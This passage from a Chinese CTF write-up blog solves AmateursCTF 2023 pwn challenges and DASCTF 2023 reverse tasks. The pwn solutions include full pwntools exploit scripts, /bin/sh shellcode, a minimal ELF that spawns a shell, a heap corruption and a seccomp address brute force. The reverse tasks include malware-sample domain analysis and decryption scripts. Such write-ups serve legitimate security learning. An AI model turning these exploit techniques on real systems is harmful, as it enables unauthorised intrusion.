asm(shellcraft.sh())sl(shellcode)#gdb.attach(io)sla(\"&gt;\",'0')io.interactive()# amateursCTF{1_l0v3_struct_p4dding}‍6.pwn-ELFcrafting-v1  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int main(int argc, const char **argv, const char **envp){    int fd; // [rsp+28h] [rbp-38h]    int v6; // [rsp+2Ch] [rbp-34h]    int v7; // [rsp+2Ch] [rbp-34h]    char buf[40]; // [rsp+30h] [rbp-30h] BYREF    setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x20uLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 32)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, argv, envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 0;}‍参考大佬wpAmateurCTF '23 - Pwn - Elfcrafting-V1 (theflash2k.me)‍​​‍​​​​‍amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}​7.pwn-ELFcrafting-v2  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int  main(int argc, const char **argv, const char **envp){    int fd; // [rsp+24h] [rbp-6Ch]    int v6; // [rsp+28h] [rbp-68h]    int v7; // [rsp+28h] [rbp-68h]    int s1; // [rsp+2Ch] [rbp-64h] BYREF    char buf[88]; // [rsp+30h] [rbp-60h] BYREF      setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    s1 = 1179403647; // ELF 文件头    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x4FuLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 79)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    if ( memcmp(&amp;s1, buf, 4uLL) )    {        puts(\"not an ELF file :/\");        exit(1);    }    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, (char *const *)argv, (char *const *)envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 0;}  超级短小的 ELF 文件BITS 32    org 0x00010000    db 0x7F, \"ELF\"    dd 1    dd 0    dd $$    dw 2    dw 3    dd _start    dd _start    dd 4_cont:    mov dl, 0xff    int 0x80    mov ebx, eax    mov al, 3    jmp _end    dw 0x20    dw 1_start:    mov al, 11    mov ebx, string_start    int 0x80_end:    mov ecx, esp    int 0x80    xor ebx, ebx    mov al, 4    int 0x80string_start:    db \"/bin/sh\"string_len equ $ - string_startfilesize equ $ - $$‍nasm -f bin -o Execve Execve.asm &amp;&amp; chmod +x Execve &amp;&amp; hexdump -C Execve‍​​elf = \"7f454c46010000000000000000000100020003002e0001002e00010004000000b2ffcd8089c3b003eb0d20000100b00bbb41000100cd8089e1cd8031dbb004cd802f62696e2f7368\"直接吧这个 bin 发送出去，‍  exploitfrom pwn import *#io = process('./chal')io = remote('amt.rs', 31179)io.recv()with open('./shell', 'rb') as f:    buf = f.read()io.sendline(buf + b'\\x00')io.sendline('cat flag.txt')io.interactive()‍​​‍amateursCTF{d1d_i_f0rg3t_t0_p4tch_32b1t_b1naries_t00!!!}‍‍8.pwn-simple-heap-v1‍可以修改一个值​​‍‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31176)#gdb.attach(io,'b *$rebase(0x001600)')def getchunk(size,data):    sla('size: ',str(size))    sla('data: ',data)pay = 0x18 * \"A\"ru('Welcome to the flag checker\\n')getchunk(len(pay),pay)ru(\"I'll give you three chances to guess my flag.\\n\")getchunk(len(pay),pay)ru('index: ')sl('-8')ru('new character:')sl('\\x91')pay = 0x80 * \"A\"getchunk(len(pay),pay)io.interactive()‍我们来动态调试分析程序‍‍-8 是我提前计算好的，我们先传进去，然后继续分析‍​‍ptr + (-8) 也就是我们 堆块ptr的size​​修改之前的堆布局，我们等会给 这个 0x21 改成 大一点，只要可以 覆盖 下面的 tcachebins就可以了​​执行完 *(ptr + v4) = v3;​ 后 的堆布局​堆布局状态​‍执行完这个free后‍​​‍​​后面先是申请一个堆块，然后check() 里面再次申请一个堆块‍​​‍执行 getchunk()后， 此时 下面的tcachebins 已经被破坏，但是check()里的申请0x80仍然可以申请到‍​​跟进去​​执行后​​也是申请到了这里​​‍然后就是 open flag 把内容 放到这个堆块里​​​​‍然后就可以‍​​‍远程​​‍flag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}‍9.pwn-perfect-sandbox  这是一个完美的沙盒，绝对没有办法泄露flag！‍  源码#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;err.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    int urandom = open(\"/dev/urandom\", O_RDONLY);    if (urandom &lt; 0) {        errx(1, \"open /dev/urandom failed\");    }    read(urandom, tmp, 4);    close(urandom);    unsigned int offset = *(unsigned int *)tmp &amp; ~0xFFF;    uint64_t addr = 0x1337000ULL + (uint64_t)offset;    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED) {        errx(1, \"mapping flag failed\");    }    int fd = open(\"flag.txt\", O_RDONLY);    if (fd &lt; 0) {        errx(1, \"open flag.txt failed\");    }    read(fd, flag, 128);    close(fd);    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED) {        errx(1, \"mmap failed\");    }    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);    if (stack == MAP_FAILED) {        errx(1, \"failed to map stack\");    }    printf(\"&gt; \");    read(0, code, 0x100000);    setup_seccomp();    asm volatile(        \".intel_syntax noprefix\\n\"        \"mov rbx, 0x13371337\\n\"        \"mov rcx, rbx\\n\"        \"mov rdx, rbx\\n\"        \"mov rdi, rbx\\n\"        \"mov rsi, rbx\\n\"        \"mov rsp, 0x13371337000\\n\"        \"mov rbp, rbx\\n\"        \"mov r8,  rbx\\n\"        \"mov r9,  rbx\\n\"        \"mov r10, rbx\\n\"        \"mov r11, rbx\\n\"        \"mov r12, rbx\\n\"        \"mov r13, rbx\\n\"        \"mov r14, rbx\\n\"        \"mov r15, rbx\\n\"        \"jmp rax\\n\"        \".att_syntax prefix\\n\"        :        : [code] \"rax\" (code)        :    );}‍  沙箱​​‍‍由于程序已经open(flag)了 ，所以我们只要使用 read 读flag,然后再用 write输出出来就OK了‍下面等会在 jmp rax 出打个断点​​‍  测试 脚本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()gdb.attach(io,'b *0x0401594')pay = asm('''          nop          nop          nop          nop''')sl(pay)io.interactive()‍​​‍  上面的啥也不是，接下来我们来详细分析一下这题…..（分析了一下午）‍​扎心了，呜呜呜，在大佬眼了就是瞬秒题      真正的开始    OK ，总的来说这题还是比较有意思的，  经过测试，这题最完美的解决方法就是爆破地址‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)io = process(binary)#io = remote('amt.rs',31173)gdb.attach(io,'b *0x0401594')offset = 0x1000 * 41   # 主要是这个偏移地址，怎么得到的，先不用管，等会就知道了# (在一台机器上偏移是固定的, 不同的机器又是不一样的）# sc = f\"\"\"mov rsi,[{elf.got['seccomp_init']}]sub rsi,{libc.sym['seccomp_init']}add rsi,{offset}mov rsi,[rsi]and esi,0xFFFFF000add rsi,0x1337000mov rax, 1mov rdi, 1mov rdx, 0x100syscall\"\"\"ru('&gt; ')sl(asm(sc))io.interactive()  由于 NO PIE 所以我们直接从 got 里拿 libc上的地址​​​‍​libc.sym['seccomp_init']​  计算一个 libc 上的基地址， 我们就选取 ​/usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.4​ 的基地址，其实其他的基地址应该也可以‍​​​​执行完这个后，rsi 里的地址指向的就是​​就是 从 /dev/urandom​ 里读的随机数(我们先叫它key)，通过这个随机数我们就可以 经过计算就得到用来存放flag的随机地址.​​然后 用 key 通过这两个计算就可以得到 flag的地址了, and eax, 0FFFFF000h​ add rax, 1337000h​​​​然后就是 flag了​​下面就是 SYS_write 输出flag就行了​​  最终通用 exploit看重点，其实只要我们 以 0x1000 的倍数去才地址就可以了，最多最多就 0xff就可以得到 我们想要的地址.也要根据实际的  libseccomp.so.2.5.3版本from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'#libelf = './libseccomp.so.2.5.3'libelf = '/lib/x86_64-linux-gnu/libseccomp.so.2'context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']elf =  ELF(binary)libc = ELF(libelf)for i in range(42,255):    io = process(binary)    io = remote('amt.rs',31173)    #gdb.attach(io,'b *0x0401594')    offset = 0x1000 * i    sc = f\"\"\"    mov rsi,[{elf.got['seccomp_init']}]    sub rsi,{libc.sym['seccomp_init']}    add rsi,{offset}     # 重点    mov rsi,[rsi]    and esi,0xFFFFF000    add rsi,0x1337000    mov rax, 1    mov rdi, 1    mov rdx, 0x100    syscall    \"\"\"    ru('&gt; ')    sl(asm(sc))    print(i)    try:        f = io.recv()        print(f)        if (b'flag' in f )or (b'FLAG' in f) or(b'ctf' in f) or (b'CTF' in f):            print(f)            break    except:        pass    io.close()‍​​​amateursCTF{3xc3pt10n_suppr3ss10n_ftw}​异常抑制ftw  参考AmateursCTF 2023 Write-Up - U+E000 私用領域 (hatenablog.com)‍‍简单操作系统 (amateurs.team)frog-math (amateurs.team)‍RE writeups‍业余爱好者CTF 2023 - 逆向工程文章 - FazeCT 博客"
  },
  
  {
    "title": "DASCTF 2023六月挑战赛｜二进制专项",
    "url": "/posts/DASCTF-2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E9%A1%B9/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-06-04 00:00:00 +0800",
    





    
    "snippet": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地...",
    "content": "二进制专项-签到‍简单统计下参与人数，祝大家玩得开心~DASCTF{Welcome_to_DASCTF5}‍Reverse-careful‍  题目给出了一个恶意样本,请分析出样本请求服务器的域名(flag的形式为DASCTF{md5(域名)}) 其中md5值都是小写‍拿到题目直接 IDA Pro 打开, 一眼就可以看 gethostbyname();动态调试可以获取name的值,但是这个地方获取的name不是真正的‍​​‍直接 快捷键 x  看 gethostbyname() 交叉引用 还有另一处‍​​‍直在这里下断点，然后动态调试‍​​‍得到 域名 Just_An_APIH00k11.com‍​​from hashlib import md5def md5sum(string):    return md5(string.encode('utf-8')).hexdigest()    passx = md5sum('Just_An_APIH00k11.com')print(x)# f18566f93963f72f463fdfa2d163c37c# flag{f18566f93963f72f463fdfa2d163c37c}‍Reverse-babyRe‍  so easy‍  根据字符串 error! 引用处一步一步往上找交叉引用的函数‍应该是函数的主要逻辑的地方了‍__int64 __fastcall sub_140007A80(int a1, __int64 a2){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *v15; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *(_DWORD *)v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( a1 != 2 )    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(*(const char **)(a2 + 8)) )      break;    Parameter[j] = *(_BYTE *)(*(_QWORD *)(a2 + 8) + j);  }  hResInfo = FindResourceW(0i64, (LPCWSTR)0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  v15 = malloc((unsigned int)Size);  memcpy(v15, Src, (unsigned int)Size);  sub_140001087(v15);  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, v15, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, (LPTHREAD_START_ROUTINE)StartAddress, Parameter, 0, 0i64);  Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}  直接看的话还不是很好看，我先修复下函数的名字  可以看注释‍__int64 __fastcall sub_140007A80(int argv_value, char **argv){  char *v2; // rdi  __int64 i; // rcx  char v5[32]; // [rsp+0h] [rbp-40h] BYREF  char v6; // [rsp+40h] [rbp+0h] BYREF  DWORD dwProcessId; // [rsp+44h] [rbp+4h]  HANDLE v8; // [rsp+68h] [rbp+28h]  char Parameter[132]; // [rsp+90h] [rbp+50h] BYREF  int j; // [rsp+114h] [rbp+D4h]  HRSRC hResInfo; // [rsp+138h] [rbp+F8h]  size_t Size; // [rsp+154h] [rbp+114h]  HGLOBAL hResData; // [rsp+178h] [rbp+138h]  void *Src; // [rsp+198h] [rbp+158h]  void *data; // [rsp+1B8h] [rbp+178h]  __int64 v16; // [rsp+1D8h] [rbp+198h]  __int64 v17; // [rsp+1F8h] [rbp+1B8h]  int k; // [rsp+214h] [rbp+1D4h]  __int64 v19; // [rsp+2E8h] [rbp+2A8h]  v2 = &amp;v6;  for ( i = 130i64; i; --i )  {    *v2 = -858993460;    v2 += 4;  }  sub_1400012A8(&amp;unk_1400140F4);                // 检测调试，需要给patch掉，直接进去把里面的代码改成 ret  dwProcessId = GetCurrentProcessId();  v8 = OpenProcess(0x1FFFFFu, 0, dwProcessId);  if ( argv_value != 2 )                        // 必须有2个参数    exit(0);  for ( j = 0; ; ++j )  {    v19 = j;    if ( j &gt;= strlen(argv[1]) )      break;    Parameter[j] = argv[1][j];                  // 将第一个参数赋值给 Parameter                                                // bbre.exe flagstrings  }  hResInfo = FindResourceW(0i64, 0x65, L\"cod\");  LODWORD(Size) = SizeofResource(0i64, hResInfo);  hResData = LoadResource(0i64, hResInfo);  Src = LockResource(hResData);  data = malloc(Size);  memcpy(data, Src, Size);  Jmp_Xor_data(data);                           // 这里一个异或加解密的操作 长度是 874  v16 = qword_14000FC30(v8, 0i64, 874i64, 4096i64, 64);  qword_14000FC28(v8, v16, data, 874i64, 0i64);  v17 = qword_14000FC18(v8, 0i64, 0i64, v16, Parameter, 0, 0i64);// Parameter 只有在这个函数才被加密  Sleep(0x1F4u);  for ( k = 0; k &lt; 44; ++k )    ;  CreateThread(0i64, 0i64, StartAddress, Parameter, 0, 0i64);// startAddress 是一个检测flag的   Sleep(0x190u);  sub_140001253(v5, &amp;unk_14000BEE0);  return 0i64;}原来还可以这样读资源文件​‍  Xor_data()‍__int64 __fastcall Xor_data(char a1[]){  __int64 result; // rax  int i; // [rsp+24h] [rbp+4h]  result = sub_1400012A8(&amp;unk_1400140F4);  for ( i = 0; i &lt; 874; ++i )  {    a1[i] ^= byte_14000F000[i % 4];    result = (unsigned int)(i + 1);  }  return result;}需要注意的是 byte_14000F000,​如果 程序处于调试状态他会修改 byte_14000F000,这里等会给它 patch 掉‍​​‍  IsDebuggerPresent()#返回值如果当前进程在调试器上下文中运行，则返回值为非零。如果当前进程未在调试器的上下文中运行，则返回值为零。‍byte_14000F000 初始值是18h, 57h, 68h, 64h‍经过动态调试后 才发现执行完 Jmp_Xor_data() 后， data 是一堆代码‍​​‍  动态调试需要传参​直接去看 data,data里存的地址才是数据‍​​如果说你看到 or      [rcx+43F8ECh], al​ 就说明，初始的 byte_14000F000 还是被改了这样的话，可以断点在异或解密的前一条直接，然后把 byte_14000F000 改回去​​‍随便打个断点​​直接给它改回去‍​​然后继续运行动态解密完后我们在看下data有些花指令，我们给它处理一下​花指令​​出来完花指令后 快捷键p 创建函数 然后可以直接F5 看C 伪代码和里面我写好的注释‍__int64 __fastcall sub_22777CDEDAD(char a1[]){  char *v1; // rdi  __int64 i; // rcx  __int64 result; // rax  char v4; // [rsp+20h] [rbp+0h] BYREF  char v5[292]; // [rsp+30h] [rbp+10h] BYREF  unsigned int k; // [rsp+154h] [rbp+134h]  unsigned int v7; // [rsp+174h] [rbp+154h]  unsigned int v8; // [rsp+194h] [rbp+174h]  int v9; // [rsp+1B4h] [rbp+194h]  char v10[44]; // [rsp+1D8h] [rbp+1B8h] BYREF  unsigned int v11; // [rsp+204h] [rbp+1E4h]  char *__attribute__((__org_arrdim(0,0))) j; // [rsp+228h] [rbp+208h]  int v13; // [rsp+244h] [rbp+224h]  __int64 v14; // [rsp+3D8h] [rbp+3B8h]  v1 = &amp;v4;  for ( i = 150i64; i; --i )  {    *v1 = -858993460;    v1 += 4;  }  memset(v5, 0, 0x101ui64);  qmemcpy(v10, \"]Bb)\", 4);  v10[4] = 3;  v10[5] = 54;  v10[6] = 71;  v10[7] = 65;  v10[8] = 21;  v10[9] = 54;  v11 = 0;  for ( j = a1; *j; ++j )    ++v11;  for ( k = 0; k &lt; 0x100; ++k )    v5[k] = k;  v8 = 0;  v7 = 0;  for ( k = 0; k &lt; 0x100; ++k )  {    v9 = v5[k];    v7 = (v10[v8] + v9 + 2 * v7) % 0x100;    v5[k] = v5[v7];    v5[v7] = v9;    if ( ++v8 &gt;= 0xA )      v8 = 0;  }  v8 = 0;  sub_22777CDEF9E();                            // 没用，等会nop掉; 随便在 nop 处下个断点，来获取上面生成v5的值，用来给下面的解密  v7 = v8;  for ( k = 0; ; ++k )  {    result = v11;    if ( k &gt;= v11 )      break;    v7 = (v8 + v7) % 0x100;    v8 = (v5[v7] + v8) % 0x100;    v9 = v5[v7];    v5[v7] = v5[v8];    v5[v8] = v9;    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100];    a1[k] ^= v13;                               // 加密处，毫无疑问 a1 就是我们传入的flag    v14 = k;    a1[k] += k % 0xD;  }  return result;}nop 掉 call sub_22777CDEF9E‍​​‍然后打断点，然后F9运行到这‍​F9 后，然后把这个int 3 也 nop 掉, 接下在上面的开头处 快捷键p ,然后f5 看C 伪代码​​再把上面的 v5 给他提取出来​​密文在Xor_data()函数里可以找到‍​​然后写解密脚本v5 = [  0x04, 0xFD, 0x67, 0xF4, 0x3F, 0x13, 0xC6, 0x86, 0x29, 0xAA,   0x89, 0x68, 0x93, 0x41, 0x6B, 0x9F, 0x95, 0x7C, 0x96, 0x87,   0x0C, 0x1C, 0x18, 0x7E, 0x23, 0x51, 0x2B, 0x72, 0x55, 0x94,   0x75, 0x3E, 0xFE, 0x00, 0x16, 0x30, 0x9B, 0x9C, 0xF6, 0x43,   0x5F, 0x69, 0x85, 0xE2, 0xE7, 0xAB, 0x7A, 0x5A, 0x0A, 0xA6,   0x81, 0x77, 0x17, 0x6C, 0xF2, 0x33, 0x6D, 0x35, 0x49, 0x0B,   0x61, 0x06, 0x34, 0xD7, 0x4B, 0x9E, 0xA3, 0x3C, 0xB5, 0x5C,   0x48, 0xB3, 0x05, 0xDC, 0xA7, 0x80, 0x71, 0x09, 0xAE, 0x28,   0x5B, 0xA8, 0xE6, 0x44, 0x14, 0xE3, 0x63, 0x4E, 0xF3, 0x1E,   0xC1, 0xDF, 0x26, 0x46, 0x07, 0x2F, 0xB1, 0x0D, 0xED, 0x6A,   0x19, 0xD1, 0xDE, 0x5E, 0x6F, 0x1D, 0x97, 0xC8, 0x66, 0xD6,   0x7B, 0xA0, 0x62, 0x3A, 0x40, 0xC5, 0x59, 0x1B, 0xCF, 0x83,   0x50, 0xC2, 0x8F, 0x58, 0xE5, 0xEA, 0x84, 0x38, 0x11, 0xC9,   0x37, 0x2E, 0xCE, 0xB8, 0x10, 0x90, 0xD9, 0x98, 0x45, 0xCD,   0xD5, 0x03, 0x57, 0x99, 0x25, 0x08, 0x74, 0xDD, 0x7D, 0xD4,   0x24, 0x12, 0x22, 0xB9, 0xBE, 0x0E, 0x4A, 0x20, 0xAF, 0xB4,   0x4F, 0x21, 0xF5, 0xCA, 0xEB, 0x0F, 0x9D, 0x36, 0xD0, 0xC3,   0x91, 0x3B, 0x2C, 0xEE, 0x1F, 0xE0, 0xB7, 0x70, 0xA2, 0x56,   0x9A, 0xB2, 0xA1, 0x60, 0xC0, 0xCC, 0xAC, 0x7F, 0xF9, 0x8A,   0xBD, 0xCB, 0x8C, 0xB6, 0x8D, 0xDB, 0x39, 0xFC, 0xD3, 0x88,   0xDA, 0x4D, 0x78, 0xFB, 0xBF, 0x1A, 0x02, 0x76, 0xBC, 0x47,   0x64, 0xE4, 0xA4, 0x4C, 0x15, 0x5D, 0xD2, 0xA5, 0x2D, 0xAD,   0xF7, 0xBA, 0x54, 0xF0, 0x8E, 0xA9, 0xEC, 0x52, 0x27, 0x42,   0xD8, 0xBB, 0xB0, 0x53, 0x31, 0x82, 0x8B, 0xEF, 0xC7, 0xF8,   0x32, 0xF1, 0xE9, 0xE8, 0x01, 0xFF, 0xC4, 0xFA, 0xE1, 0x65,   0x79, 0x73, 0x92, 0x6E, 0x2A, 0x3D, 0x00  ]flag = [0] * 45flag[0] = 0xF7flag[1] = 0x2Eflag[2] = 0x34flag[3] = 0xF0flag[4] = 0x72flag[5] = 0xCFflag[6] = 94flag[7] = 10flag[8] = 0xBBflag[9] = 0xECflag[10] = 0xB1flag[11] = 0x2Bflag[12] = 0x70flag[13] = 0x88flag[14] = 0x88flag[15] = 0xEDflag[16] = 0x46flag[17] = 0x38flag[18] = 0xDBflag[19] = 0xDAflag[20] = 0x6Cflag[21] = 0xBDflag[22] = 0xD4flag[23] = 6flag[24] = 0x77flag[25] = 0xF2flag[26] = 0xCFflag[27] = 0x56flag[28] = 0x88flag[29] = 0xC6flag[30] = 0x31flag[31] = 0xD2flag[32] = 0xB7flag[33] = 90flag[34] = 0xC1flag[35] = 0x42flag[36] = 0xB0flag[37] = 0xF4flag[38] = 72flag[39] = 0x37flag[40] = 0xF5flag[41] = 0x2Cflag[42] = 245flag[43] = 88v8 = 0v7 = 0for k in range(44):    v7 = (v8 + v7) % 0x100    v8 = (v5[v7] + v8) % 0x100    v9 = v5[v7]    v5[v7] = v5[v8]    v5[v8] = v9    v13 = v5[(v5[v7] + v8 + v5[v8]) % 0x100]    flag[k] -= k % 0xD    flag[k] ^= v13    flag[k] = flag[k] % 128print(flag)print(''.join(map(chr,flag)))[68, 65, 83, 67, 84, 70, 123, 48, 51, 52, 52, 54, 99, 50, 99, 45, 100, 102, 102, 55, 45, 49, 49, 101, 100, 45, 57, 50, 56, 53, 45, 53, 52, 101, 49, 97, 100, 57, 56, 100, 54, 52, 57, 125, 0]DASCTF{03446c2c-dff7-11ed-9285-54e1ad98d649}‍Reverse-ez_exe‍‍一共三个文件​​ez_exe.exe 是 python3.11 打包的‍​​用 python3.11 执行 pyinstxtractor.py 去解包​再用 Pycdc 去还原 python源代码#=[09:17:03]-➤  /opt/reverse/Pycdc ez_py.pyc # Source Generated with Decompyle++# File: ez_py.pyc (Python 3.11)import ctypesfrom time import *from ctypes import *from ctypes import wintypesfrom hashlib import md5class _STARTUPINFO(Structure):    _fields_ = [        ('cb', c_ulong),        ('lpReserved', c_char_p),        ('lpDesktop', c_char_p),        ('lpTitle', c_char_p),        ('dwX', c_ulong),        ('dwY', c_ulong),        ('dwXSize', c_ulong),        ('dwYSize', c_ulong),        ('dwXCountChars', c_ulong),        ('dwYCountChars', c_ulong),        ('dwFillAttribute', c_ulong),        ('dwFlags', c_ulong),        ('wShowWindow', c_ushort),        ('cbReserved2', c_ushort),        ('lpReserved2', c_char_p),        ('hStdInput', c_ulong),        ('hStdOutput', c_ulong),        ('hStdError', c_ulong)]class _PROCESS_INFORMATION(Structure):    _fields_ = [        ('hProcess', c_void_p),        ('hThread', c_void_p),        ('dwProcessId', c_ulong),        ('dwThreadId', c_ulong)]StartupInfo = _STARTUPINFO()ProcessInfo = _PROCESS_INFORMATION()key1 = bytes(md5(b'bin1bin1bin1').hexdigest().encode())file = open('bin1', 'rb').read()arr = range(len(file))()open('bin1', 'wb').write(bytes(arr))sleep(0)bet = ctypes.windll.kernel32.CreateProcessA(b'bin1', ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(0), byref(StartupInfo), byref(ProcessInfo))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ProcessInfo.hProcess), ctypes.c_int(-1))open('bin1', 'wb').write(file)直接看的话，好像有点奇怪，key1 都没有调用的地方主要还是解密了bin1, 用 python3.11 运行 ez_py.pyc,会生成一个 gmon.out​运行后，bin1 会从密文状态解密成一个 PE32 可执行程序，‍​​​​‍HeD 打开 这个 ez_py.pyc 然后将 bin1 